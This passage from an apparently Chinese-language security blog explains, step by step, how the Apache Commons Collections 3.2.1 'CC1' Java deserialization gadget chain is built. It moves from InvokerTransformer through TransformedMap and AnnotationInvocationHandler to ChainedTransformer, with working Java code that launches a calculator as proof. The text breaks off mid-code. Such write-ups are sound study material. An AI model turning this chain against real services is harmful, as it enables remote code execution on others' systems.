href=\"https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/b3ce30db46ab\">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/b3ce30db46ab</a></p>\n<p>我们下载一个zip压缩的</p>\n<p><img src=\"D1E0EooyW1W7DsmynSAfr6Q4ZRDDZqtRjAgDOVH-cbc.png\" alt=\"image\"></p>\n<p>把sun文件夹拷贝到我们的idea项目中；路径：jdk-b3ce30db46ab&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun</p>\n<p>collections-3.2.1下载</p>\n<p><a href=\"https://github.com/apache/commons-collections/releases/tag/collections-3.2.1\">https://github.com/apache/commons-collections/releases/tag/collections-3.2.1</a></p>\n<p>解压后把源码放到idea中</p>\n<p><img src=\"mJWfS7R1qTwaGaaTjBFRldcFoQ1QGGydyQ0fHBlyEfk.png\" alt=\"image\"></p>\n<h2 id=\"Java常用的执行命令的方式\"><a href=\"#Java常用的执行命令的方式\" class=\"headerlink\" title=\"Java常用的执行命令的方式\"></a>Java常用的执行命令的方式</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/6/1 2:49 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestExe</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;open -a Calculator.app&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"qxwWwKgc2J_HcB19wUDe-vBrwDzCQHpyW8MidbwGcEQ.png\" alt=\"image\"></p>\n<h2 id=\"通过反射执行命令的方式\"><a href=\"#通过反射执行命令的方式\" class=\"headerlink\" title=\"通过反射执行命令的方式\"></a>通过反射执行命令的方式</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/6/1 2:49 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestExe</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class=\"line\">        <span class=\"type\">Runtime</span> <span class=\"variable\">runtime</span> <span class=\"operator\">=</span> Runtime.getRuntime();</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Runtime.class;</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class);</span><br><span class=\"line\">        <span class=\"comment\">//禁止method的访问控制检查</span></span><br><span class=\"line\">        method.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        method.invoke(runtime, <span class=\"string\">&quot;open -a Calculator.app&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"uuFi1kBAoo2_m2SmWQY8-fYTP2VFiz5qW0k5jyxsmxg.png\" alt=\"image\"></p>\n<h2 id=\"分析CC1\"><a href=\"#分析CC1\" class=\"headerlink\" title=\"分析CC1\"></a>分析CC1</h2><h3 id=\"触发点\"><a href=\"#触发点\" class=\"headerlink\" title=\"触发点\"></a>触发点</h3><p>根据new Transformer查看到其接口</p>\n<p><img src=\"GPWo1wS1JoR7_l5WOp6xv_kNomUB16yOol55PTK0Ong.png\" alt=\"image\"></p>\n<p>我们跟进去看看，发现有一个InvokerTransformer的实现类。</p>\n<p><img src=\"G0g2g_LSRYxLU2oczSPi4AHapjlv3uYSLghe0DGq9wM.png\" alt=\"image\"></p>\n<p>在这个InvokerTransformer实现类实现了transform接口。其代码如下；其大概的意思是传入一个对象，函数通过反射的方式调用一个指定类（cls）的方法（iMethodName），并将指定的参数（iArgs）传递给方法进行执行，最终得到方法的返回值。</p>\n<p><img src=\"IMYnxYuNnSHp8xvg-6vEz3aY6Wj9gOvmRO6S8c6q3yw.png\" alt=\"image\"></p>\n<p>我们来看一下InvokerTransformer的构造函数。该构造函数的参数有三个，其中methodName是一个字符串类型的变量，表示所要调用的方法名；paramTypes是一个Class类型数组，表示所要调用的方法的参数类型列表；args是一个Object类型数组，表示所要传递给方法的参数值列表。</p>\n<p><img src=\"gHZJ03BYbi7MUYE4qcTbLnqwUh8gKbIFmIT0wPDBGXg.png\" alt=\"image\"></p>\n<p>下面我们实现调用上述的InvokerTransformer.transform来进行一个简单的弹计算器的操作。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Runtime</span> <span class=\"variable\">runtime</span> <span class=\"operator\">=</span> Runtime.getRuntime();</span><br><span class=\"line\"><span class=\"type\">InvokerTransformer</span> <span class=\"variable\">invokerTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;</span><br><span class=\"line\">        , <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;);</span><br><span class=\"line\">invokerTransformer.transform(runtime);</span><br></pre></td></tr></table></figure>\n<p>成功执行了打开计算器的命令</p>\n<p><img src=\"YpzB5D8Gbr8lp1UbD51Y4MiQZp0QmvUqExNljGGT6Jc.png\" alt=\"image\"></p>\n<p>至此我们只是找到了一个能够执行命令的方法，入口还没找到。</p>\n<p>既然InvokerTransformer是Transformer接口的其中一个实现类的方法，那么我们来看看哪里能够调用到Transformer接口</p>\n<p>此时的链子是：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">InvokerTransformer.transform()</span><br><span class=\"line\">    Method.invoke()</span><br><span class=\"line\">        Class.getMethod()</span><br><span class=\"line\">InvokerTransformer.transform()</span><br><span class=\"line\">    ​Method.invoke()</span><br><span class=\"line\">        Runtime.getRuntime()</span><br><span class=\"line\">InvokerTransformer.transform()</span><br><span class=\"line\">    Method.invoke()</span><br><span class=\"line\">        Runtime.exec()</span><br></pre></td></tr></table></figure>\n<p>找调用 transform 方法的地方（alt+F7）；我们来重点关注下面的这三个方法。</p>\n<p><img src=\"DQmHMRnu-eIkxFWgugkrxhjFAaHvb-zSL_fo1O9yPEU.png\" alt=\"image\"></p>\n<p>我们来看一下transformKey；大概的意思是接收一个对象作为参数，如果 keyTransformer 不为 null，则调用 keyTransformer.transform(object) 对该对象进行转换操作后返回；否则直接将该对象返回。（此处的transform(object)正是我们想要的）</p>\n<p><img src=\"RAUcHYU1LUOIge8171Kwnpnh9bBDsSLHr-8RTAvibNs.png\" alt=\"image\"></p>\n<p>我们继续看，怎么样才能调用transformKey。查看调用链，发现有两个调用到它；但很遗憾这个transformMap不能直接调用；因为它使用了protected 修饰，只能被当前类及其子类访问。</p>\n<p><img src=\"HUpnIFvajKBC-sttRnS9TlwJ5Wz84qg_VcdokgFo4IU.png\" alt=\"image\"></p>\n<p>我们来看put这个方法；传入了两个对象，分别赋值转换之后进行返回，期间调用到了我们上述的transformKey方法，是我们想要的方法。</p>\n<p><img src=\"-F4fGVqODsxhjEBh8ERAPBrcIR8RbuxjvwRsDCX0OOA.png\" alt=\"image\"></p>\n<p>如此一来我们可以实例化一个TransformedMap对象，然后我们再调用put方法即可。那么怎么才能实例化一个TransformedMap对象呢？</p>\n<p>我们传统的想法就是直接new一个，但是这里的TransformedMap的构造方法使用了protected 修饰。所以只能考虑其他方法了。</p>\n<p><img src=\"nxh20n5YbKq26uk3_QvoqJeNey_iJ0ENBS7AcQ9ZbVE.png\" alt=\"image\"></p>\n<p>于是在decorate和decorateTransform方法里面有实例化TransformedMap的操作。</p>\n<p><img src=\"lpII12iWLb8IZwxr2CT7ZNeSVW7FFbsaFmuG1R6aBcU.png\" alt=\"image\"></p>\n<p>我们直接看decorate，这个静态方法接收三个参数：一个 Map 对象（即要被转换的原始 Map，可以为空），以及两个 Transformer 对象。</p>\n<p><img src=\"re55epdV-GRLdOfJ45MDo7QMoy5fNcXa3MuVVamv2BY.png\" alt=\"image\"></p>\n<p>好了，下面我们开始构造，它要什么我们就给什么。要一个map对象，我们直接创建一个hashmap，然后给它传进去。keyTransformer我们传一个实例化的InvokerTransformer对象,这里是exec；然后我们再调用put方法把Runtime实例化的对象传给它，至于value就随意给个值就行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/26 4:12 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestInvokerTransformer</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Runtime</span> <span class=\"variable\">runtime</span> <span class=\"operator\">=</span> Runtime.getRuntime();</span><br><span class=\"line\">        <span class=\"type\">InvokerTransformer</span> <span class=\"variable\">exec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;);</span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        System.out.println(hashedMap.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">decorate</span> <span class=\"operator\">=</span> TransformedMap.decorate(hashedMap, exec, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        decorate.put(runtime,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试成功</p>\n<p><img src=\"xvVP_M7RPO0wVHYvX5GlRyJ1R-w1otFIoyYNLSfDNHE.png\" alt=\"image\"></p>\n<p>此时的链子是</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">TransformedMap.decorate()</span><br><span class=\"line\">    put()</span><br><span class=\"line\">​    InvokerTransformer.transform()</span><br><span class=\"line\">​        Method.invoke()</span><br><span class=\"line\">​            Class.getMethod()</span><br><span class=\"line\">​    InvokerTransformer.transform()</span><br><span class=\"line\">​        Method.invoke()</span><br><span class=\"line\">​            Runtime.getRuntime()</span><br><span class=\"line\">​    InvokerTransformer.transform()</span><br><span class=\"line\">​        Method.invoke()</span><br><span class=\"line\">​            Runtime.exec()</span><br></pre></td></tr></table></figure>\n\n\n<p>此时就会遇到一个问题，当我查找哪里在调用put的时候，发现有很多方法，所以不得不放弃这条路，寻找其他的。</p>\n<p><img src=\"8Jzqywe5nemBrJXSdyJs0k-qhXQ5ak1yf9w--pFgPz0.png\" alt=\"image\"></p>\n<p>我们再仔细看，在checkSetValue方法里面也调用了transform。</p>\n<p><img src=\"oyuPzDnlBvrR-nArcIwTH_U32-dxkJVS8dVrExxYqZs.png\" alt=\"image\"></p>\n<p>然后在org.apache.commons.collections.map的MapEntry实现类的setValue方法中调用了checkSetValue。</p>\n<p><img src=\"I-81MVTr1xzoxcy0fPzb18d3MdeCJVFwvzd1cg16bWc.png\" alt=\"image\"></p>\n<p> setValue(Object value) 方法用于将键-值映射中给定键所对应的值替换成指定的值，并返回原来该键所对应的值。</p>\n<p><img src=\"eay6bKMhl_1AB_wTnGI5zVtMT9Kb943qtuQv2g6iYiY.png\" alt=\"image\"></p>\n<p>下一步就是要解决怎么实现调用setValue方法。</p>\n<p>使用 Map.Entry 的方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/26 4:12 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestInvokerTransformer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Runtime</span> <span class=\"variable\">runtime</span> <span class=\"operator\">=</span> Runtime.getRuntime();</span><br><span class=\"line\">        <span class=\"type\">InvokerTransformer</span> <span class=\"variable\">exec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;);</span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        hashedMap.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(hashedMap,  <span class=\"literal\">null</span>,exec);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Map.Entry entry:decorate.entrySet())&#123;</span><br><span class=\"line\">            <span class=\"comment\">//将作用于每个entry的键值上，将其设置为runtime</span></span><br><span class=\"line\">            entry.setValue(runtime);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>测试成功</p>\n<p><img src=\"uiWceugA9Bq_Hl09HF7hnz6ObOpwgKOf8mX9UEcmC10.png\" alt=\"image\"></p>\n<h3 id=\"AnnotationInvocationHandler\"><a href=\"#AnnotationInvocationHandler\" class=\"headerlink\" title=\"AnnotationInvocationHandler\"></a>AnnotationInvocationHandler</h3><p>寻找一个与上面类似的，遍历map的方法</p>\n<p>alt+f7查看调用关系，发现有一个类AnnotationInvocationHandler的readObject方法里面有调用到setValue</p>\n<p><img src=\"JYslLCEc5wh2rdpYahHgXgDPBzNRUj_4VxedFUcSyvA.png\" alt=\"image\"></p>\n<p>这里首先调用默认的readObject方法进行反序列化操作，将对象还原为字节序列。然后遍历成员值Map，逐个检查是否存在需要转型的情况。</p>\n<p><img src=\"UnDbP-7Ur6n9rkFhtYc9OWTfX4CRUvry5WjmKr-ijvY.png\" alt=\"image\"></p>\n<p>紧接着我们去看它的构造函数；这是个动态代理类，首先呢是传入一个需要动态代理的类，然后传入一个map，</p>\n<p><img src=\"rpk4yZ0XfUcMX6oeL-_IkH4dxRzfUa3Qf19fXePHjgM.png\" alt=\"image\"></p>\n<p>我们通过反射去调用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class&lt;?&gt; Clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">Constructor&lt;?&gt; declaredConstructor = Clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">declaredConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">o</span> <span class=\"operator\">=</span> declaredConstructor.newInstance(Override.class, decorate);</span><br></pre></td></tr></table></figure>\n<h3 id=\"runtime序列化和反序列化\"><a href=\"#runtime序列化和反序列化\" class=\"headerlink\" title=\"runtime序列化和反序列化\"></a>runtime序列化和反序列化</h3><p>到这之后，我们去看一下runtime，发先它是没有继承Serializable，所以它不能够直接进行序列化和反序列化。</p>\n<p><img src=\"io8u4lRzpKkygyB4vqKc1dmBabP2XN2w_noHVkP2h_Y.png\" alt=\"image\"></p>\n<p>让runtime能够进行序列化和反序列化，我们可以通过反射去创建和调用这个类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Runtime.class;</span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">getRuntime</span> <span class=\"operator\">=</span> clazz.getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"type\">Runtime</span> <span class=\"variable\">invoke</span> <span class=\"operator\">=</span> (Runtime) getRuntime.invoke(<span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">execz</span> <span class=\"operator\">=</span> clazz.getMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class);</span><br><span class=\"line\">execz.invoke(invoke,<span class=\"string\">&quot;open -a Calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p><img src=\"IitTO8tNVJIJAg-Stv-0ZOLFLP_ez1PAb4xFtStG4Q8.png\" alt=\"image\"></p>\n<p>修改成使用invokerTransformer.transform来调用的形式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">getRuntime</span> <span class=\"operator\">=</span> (Method) <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;).transform(Runtime.class);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Runtime</span> <span class=\"variable\">invoke</span> <span class=\"operator\">=</span> (Runtime) <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;).transform(getRuntime);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;).transform(invoke);</span><br></pre></td></tr></table></figure>\n<p><img src=\"YeevatMH73x4NO1k9w5nyO0fwkGjnSFeMPeojaZ84n4.png\" alt=\"image\"></p>\n<p>至此，Runtime 的序列化和反序列化问题解决了。</p>\n<h3 id=\"ChainedTransformer封装\"><a href=\"#ChainedTransformer封装\" class=\"headerlink\" title=\"ChainedTransformer封装\"></a>ChainedTransformer封装</h3><p>由于它是 transform 的循环调用的。我们在org.apache.commons.collections.functors的 ChainedTransformer中发现一段代码可以满足我们循环调用。</p>\n<p><img src=\"NQwwFDPBQws2f-OGjYA-wCVP42WeTuCvbp6vaP0tIdI.png\" alt=\"image\"></p>\n<p>改写成调用ChainedTransformer的transform进行循环调用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/6/1 2:49 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestExe</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Runtime.class;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        chainedTransformer.transform(clazz);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"xR1IQld4BZ_X2sjj-R0q4A_9_b9GBLdp2fJ75VC-E6Q.png\" alt=\"image\"></p>\n<p>我们来看到ConstantTransformer这个类是继承了Transformer和反序列化接口的</p>\n<p><img src=\"0boHOu-bBR8h9CKQAVp-FAPJdfFvG7XEuVS_lmKKblE.png\" alt=\"image\"></p>\n<p>它的构造方法和transform方法</p>\n<p><img src=\"EYeZJW8_kHnvXQzhQEjmCyn1R4IYK9d4KrJXUW5eqcY.png\" alt=\"image\"></p>\n<p>于是我们可以构造成下面的这个形式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/6/1 2:49 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestExe</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span 